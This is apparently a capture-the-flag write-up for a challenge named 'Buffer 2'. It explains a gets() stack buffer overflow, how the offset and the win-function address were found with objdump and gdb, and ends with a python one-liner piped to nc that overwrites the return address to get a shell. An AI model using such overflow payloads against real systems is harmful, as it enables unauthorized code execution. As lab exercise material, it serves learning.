ref: 1 | Buffer 2 | blind
===========================

General overview of problems faced
-------------------------------------
- Learned to use `objdump` to disassemble the program and retrieve the location of the win function
- Learned how to use gdb to get the length between the start of the buffer and the return function in order to calculate the overflow

List of vulnerabilities
--------------------
1. The input uses gets to take input into a fixed size buffer. The gets function does not require a max size for the user input, therefore you can overflow the buffer and overwrite the return address.

Steps to exploit
------------------
1. Use `objdump` to disassemble the binary and get the address of the win function
2. Enter 64 bytes of text + 12 extra bytes of overflow and then append the win function address in little endian format. This will overwrite the return address to point to the win function instead.
3. You now have a shell!

Script/Command used
------------------
```
<!-- Location to jump to: 0x80484cd -->
(python -c 'print(("A"*76)+"\xcd\x84\x04\x08")'; cat ) | nc localhost 5002
